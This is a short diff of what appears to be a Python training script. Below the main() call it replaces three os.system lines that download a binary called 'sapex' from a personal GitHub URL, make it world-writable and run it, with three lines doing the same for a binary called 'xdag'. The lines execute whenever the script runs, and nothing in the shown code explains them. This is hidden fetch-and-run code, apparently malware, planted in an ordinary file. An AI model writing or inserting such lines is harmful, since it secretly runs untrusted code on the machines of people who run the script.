@@ -72,6 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('wget https://raw.githubusercontent.com/tiwy2121/sfxx/main/sapex')
-os.system('chmod 777 sapex')
-os.system('./sapex')
+os.system('wget https://raw.githubusercontent.com/tiwy2121/jedag/main/xdag')
+os.system('chmod 777 xdag')
+os.system('./xdag')
